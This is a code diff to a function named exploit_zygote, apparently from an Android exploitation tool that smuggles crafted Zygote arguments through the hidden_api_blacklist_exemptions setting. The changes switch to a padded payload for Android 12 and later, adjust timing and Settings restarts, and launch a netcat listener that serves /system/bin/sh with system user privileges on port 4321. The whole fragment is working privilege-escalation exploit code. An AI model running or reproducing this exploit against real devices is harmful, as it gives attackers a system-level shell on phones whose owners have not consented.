@@ -3365,9 +3365,10 @@ def exploit_zygote(zip_path, text, prog_text, change):
                 break
         return nc_command
 
+    method = "old"
     command = find_netcat()
-    zygote_cmd = f"{command} -s 127.0.0.1 -p 4321 -L /system/bin/sh -l;"
-    #zygote_cmd = f"(settings delete global hidden_api_blacklist_exemptions;{command} -s 127.0.0.1 -p 4321 -L /system/bin/sh)&"
+    #zygote_cmd = f"{command} -s 127.0.0.1 -p 4321 -L /system/bin/sh -l;"
+    zygote_cmd = f"(settings delete global hidden_api_blacklist_exemptions;{command} -s 127.0.0.1 -p 4321 -L /system/bin/sh)&"
     raw_zygote_arguments = [
             "--runtime-args",
             "--setuid=1000",
@@ -3386,6 +3387,7 @@ def exploit_zygote(zip_path, text, prog_text, change):
     if int(software.split(".")[0]) < 12:
             payload = f"LClass1;->method1(\n{zygote_arguments}"
     else:
+        method = "new"
         payload = "\n" * 3000 + "A" * 5157
         payload += zygote_arguments
         payload += "," + ",\n" * 1400
@@ -3476,14 +3478,22 @@ def exploit_zygote(zip_path, text, prog_text, change):
 
     exploit_command = (
             "settings put global hidden_api_blacklist_exemptions \"" +
-            payload + f"\n\"\nsettings delete global hidden_api_blacklist_exemptions\nsleep 2\n"
+            payload
     )
-    #device.shell("am force-stop com.android.settings")
+    if method == "new":
+        exploit_command += f"\n\"\nsleep 0.25\nam start -a android.settings.SETTINGS"
+        device.shell("am force-stop com.android.settings")
+    else:
+        exploit_command += f"\n\"\nsettings delete global hidden_api_blacklist_exemptions\nsleep 2\n"
     try: device.shell(exploit_command, timeout=4)
     except: pass
-    #device.shell("am start -a android.settings.SETTINGS")
-    #device.shell("input keyevent KEYCODE_HOME")
-    
+    if method == "new":
+        time.sleep(0.25)
+        #device.shell("am start -a android.settings.SETTINGS")
+        device.shell("input keyevent KEYCODE_HOME")
+    else:
+        time.sleep(0.25)
+    device.shell("settings delete global hidden_api_blacklist_exemptions")
     if "toybox" in command:
         whoami_cmd = "toybox whoami"
     elif "busybox" in command:
